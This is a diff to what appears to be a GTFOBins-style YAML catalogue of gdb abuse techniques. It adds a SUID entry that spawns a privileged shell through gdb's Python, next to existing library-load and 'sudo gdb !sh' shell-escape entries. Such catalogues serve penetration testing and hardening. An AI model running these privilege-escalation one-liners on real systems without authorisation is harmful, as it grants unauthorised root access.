@@ -47,6 +47,8 @@ functions:
   library-load:
     - description: This requires that GDB is compiled with Python support.
       code: gdb -nx -ex 'python from ctypes import cdll; cdll.LoadLibrary("lib.so")' -ex quit
+  suid:
+    - code: ./gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
   sudo:
     - code: sudo gdb -nx -ex '!sh' -ex quit
   capabilities:
